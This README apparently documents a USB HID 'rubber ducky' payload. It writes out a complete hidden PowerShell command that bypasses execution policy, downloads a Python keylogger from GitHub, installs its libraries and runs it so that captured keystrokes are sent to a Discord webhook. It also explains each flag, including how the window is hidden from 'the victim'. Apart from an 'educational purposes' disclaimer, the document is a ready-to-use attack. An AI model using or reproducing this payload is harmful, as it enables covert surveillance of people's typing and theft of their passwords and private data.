THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES


# What it Does

This payload executes a powershell command that downloads a python keylogger and runs it. This keylogger sends the keys pressed over discord using a webhook.

# How it Works:

## The rubber ducky script
When the grabber.dd runs it opens a powershell terminal window and enters this string:

```powershell
powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py ; py -m pip install discordwebhook pynput ; Python logger.py <Your discord webhook here>"
```

### Flags used:

The ```powershell -w h -NoP -NonI -Exec Bypass -c``` tells powershell to execute a set of commands with some flags:
- ```-w h``` tells powershell to run in a hidden window so the victim cant see logs
- ```-NoP``` makes sure that none of the users profiles are loaded, which could mess up execution
- ```-NonI``` Makes the user unable to interact with the script while its running
- ```-Exec Bypass``` Makes powershell bypass the execution policy which allows powershell to run scripts
- ```-c``` tells powershell what commands to execute, the commands are enclosed in quotes and seperated with semicolons
- Now the script proceecds to execute a sequence of commands

  (copied from the [chrome password stealer](https://github.com/simen64/Pico-HID-Scripts/tree/main/chrome-password-stealerw) README thats made by me)

  ### Commands ran:

  1. First we run ```cd $env:USERPROFILE\Documents``` to enter the users Documents folder where we will be downloading our keylogger
  2. Then we use ```iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py``` to download the ```logger.py``` script and place it in the Documents folder using -OutFile
  3. Before running the python script we use ```py -m pip install discordwebhook pynput``` to download the needed python libraries (if these libraries are found pip skips this step and proceeds)
  4. And last we do ```Python logger.py <Your discord webhook here>``` to run the python script and using our webhook as an argument which the python script uses
